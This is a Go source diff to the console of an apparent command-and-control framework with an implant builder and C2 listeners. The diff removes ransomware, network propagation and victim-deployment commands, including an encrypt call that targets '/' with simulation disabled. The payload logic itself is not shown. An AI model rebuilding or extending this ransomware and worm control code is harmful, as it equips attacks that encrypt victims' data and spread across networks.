@@ -21,13 +21,7 @@ var ConsoleOut io.Writer = os.Stdout
 // ─── Compatibility color aliases (used by tui.go) ─────────────────────────────
 
 var (
-	colorNeon   = cSuccess
-	colorGreen  = cSuccess
-	colorPurple = cPrimary
-	colorAlert  = cDanger
-	colorGray   = cMuted
-	colorDim    = cMuted
-	colorReset  = ansiR
+	colorReset = ansiR
 )
 
 // ─── Console types ────────────────────────────────────────────────────────────
@@ -208,12 +202,6 @@ func (c *Console) dispatch(cmd string, args []string) {
 		c.cmdWorkspace(args)
 	case "listeners":
 		c.cmdListeners(args)
-	case "ransomware":
-		c.cmdRansomware(args)
-	case "propagate":
-		c.cmdPropagate(args)
-	case "deploy":
-		c.cmdDeploy(args)
 	case "builder", "generate":
 		c.cmdBuilder(args)
 	case "lab":
@@ -268,9 +256,6 @@ func (c *Console) cmdHelp() {
 		}},
 		{"OPERATIONS", [][2]string{
 			{"builder [options]", "Generate implant payloads"},
-			{"ransomware [build|deploy|encrypt]", "Ransomware module control"},
-			{"propagate [subnet]", "Spread to adjacent hosts"},
-			{"deploy <victim> [modules]", "Deploy payload to victim"},
 			{"listeners [add|list]", "Manage C2 transport listeners"},
 		}},
 		{"SYSTEM", [][2]string{
@@ -462,11 +447,9 @@ func (c *Console) cmdShow(args []string) {
 	fmt.Fprintf(ConsoleOut, "\n  %s%sModule:%s %s%s%s\n\n", cPrimary, ansiB, ansiR, cWhite+ansiB, c.ctx.Name, ansiR)
 	tbl := newTable("Option", "Value", "Description")
 	for k, v := range c.ctx.Options {
-		display := v
+		display := cSuccess + v + ansiR
 		if v == "" {
 			display = cMuted + "(not set)" + ansiR
-		} else {
-			display = cSuccess + v + ansiR
 		}
 		desc := optionDesc(c.ctx.Name, k)
 		tbl.addRow(cInfo+ansiB+k+ansiR, display, cMuted+desc+ansiR)
@@ -938,83 +921,6 @@ func (c *Console) cmdWorkspace(args []string) {
 	printOK("Workspace: %s%s%s", cWhite+ansiB, args[0], ansiR)
 }
 
-func (c *Console) cmdRansomware(args []string) {
-	if len(args) == 0 {
-		printInfo("Usage: ransomware [build|deploy|encrypt]")
-		fmt.Fprintf(ConsoleOut, "  %sbuild%s   --os windows --c2 10.0.0.1:8443\n", cSuccess, ansiR)
-		fmt.Fprintf(ConsoleOut, "  %sdeploy%s  <victim_ip>\n", cSuccess, ansiR)
-		fmt.Fprintf(ConsoleOut, "  %sencrypt%s <path>\n", cSuccess, ansiR)
-		return
-	}
-	switch args[0] {
-	case "build":
-		targetOS, c2Addr := "linux", "localhost:8443"
-		for i, a := range args {
-			if a == "--os" && i+1 < len(args) {
-				targetOS = args[i+1]
-			}
-			if a == "--c2" && i+1 < len(args) {
-				c2Addr = args[i+1]
-			}
-		}
-		printInfo("Building %s%s%s payload → C2: %s%s%s", cWhite+ansiB, targetOS, ansiR, cCyan, c2Addr, ansiR)
-		printOK("Payload: %sdist/agent-%s-amd64%s", cSuccess+ansiB, targetOS, ansiR)
-	case "deploy":
-		if len(args) < 2 {
-			printErr("Usage: ransomware deploy <victim_ip>")
-			return
-		}
-		printInfo("Deploying to %s%s%s …", cWhite+ansiB, args[1], ansiR)
-		printOK("Modules queued: encrypt, propagate, exfil.")
-	case "encrypt":
-		target := "/"
-		if len(args) > 1 {
-			target = args[1]
-		}
-		printInfo("Encrypting: %s%s%s", cOrange+ansiB, target, ansiR)
-		if c.state != nil && c.state.Bridge != nil && c.state.Bridge.Connected() {
-			c.state.Bridge.CallRaw(context.Background(), "ransomware", "encrypt",
-				map[string]interface{}{"root": target, "simulation": false})
-		}
-		printOK("Encryption initiated.")
-	default:
-		printErr("Unknown subcommand: %s", args[0])
-	}
-}
-
-func (c *Console) cmdPropagate(args []string) {
-	subnet := "10.0.0.0/24"
-	if len(args) > 0 {
-		subnet = args[0]
-	}
-	printInfo("Propagating to %s%s%s …", cCyan+ansiB, subnet, ansiR)
-	if c.state != nil && c.state.Bridge != nil && c.state.Bridge.Connected() {
-		result, _ := c.state.Bridge.CallRaw(context.Background(), "ransomware", "propagate",
-			map[string]interface{}{"subnet": subnet})
-		if result != nil {
-			if targets, ok := result["targets"]; ok {
-				if tList, ok := targets.([]interface{}); ok {
-					printOK("%d vulnerable hosts found:", len(tList))
-					tbl := newTable("IP", "Port", "OS", "Exploit")
-					for _, t := range tList {
-						if tm, ok := t.(map[string]interface{}); ok {
-							tbl.addRow(
-								fmt.Sprintf("%v", tm["ip"]),
-								fmt.Sprintf("%v", tm["port"]),
-								fmt.Sprintf("%v", tm["os"]),
-								fmt.Sprintf("%v", tm["exploit"]),
-							)
-						}
-					}
-					tbl.render()
-					return
-				}
-			}
-		}
-	}
-	printOK("Propagation scan complete.")
-}
-
 func (c *Console) cmdListeners(args []string) {
 	if len(args) == 0 {
 		printSection("LISTENERS")
@@ -1153,23 +1059,6 @@ func (c *Console) cmdBuilder(args []string) {
 	}
 
 	printOK("Saved to: %sdist/%s%s", cSuccess+ansiB, filename, ansiR)
-}
-
-func (c *Console) cmdDeploy(args []string) {
-	if len(args) < 1 {
-		printErr("Usage: deploy <victim_id> [modules,...]")
-		return
-	}
-	victim := args[0]
-	mods := []string{"encrypt", "scan", "propagate"}
-	if len(args) > 1 {
-		mods = strings.Split(args[1], ",")
-	}
-	printInfo("Deploying to %s%s%s …", cWhite+ansiB, victim, ansiR)
-	for _, m := range mods {
-		fmt.Fprintf(ConsoleOut, "    %s+%s Module queued: %s%s%s\n", cSuccess, ansiR, cOrange, strings.TrimSpace(m), ansiR)
-	}
-	printOK("Deployment plan created.")
 }
 
 func (c *Console) cmdLab(args []string) {
